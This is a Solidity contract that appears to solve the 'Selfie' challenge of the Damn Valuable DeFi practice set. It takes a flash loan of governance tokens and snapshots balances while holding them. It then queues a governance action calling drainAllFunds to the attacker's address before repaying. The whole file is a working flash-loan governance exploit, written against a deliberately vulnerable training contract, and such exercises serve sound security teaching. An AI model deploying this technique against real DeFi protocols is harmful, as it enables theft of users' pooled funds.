// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "./Selfie.t.sol";
import {SelfiePool} from "./Selfie.t.sol";

contract Receiver {
    address private owner;
    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;
    uint256 actionNum;

    constructor(
        address tokenAddr,
        address governanceAddr,
        address poolAddr
    ) {
        owner = msg.sender;
        token = DamnValuableTokenSnapshot(tokenAddr);
        governance = SimpleGovernance(governanceAddr);
        pool = SelfiePool(poolAddr);
    }

    function flashLoan(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function receiveTokens(address tokenAddr, uint256 amount) public {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        governance.queueAction(address(pool), data, 0);
        token.transfer(address(pool), amount);
    }
}
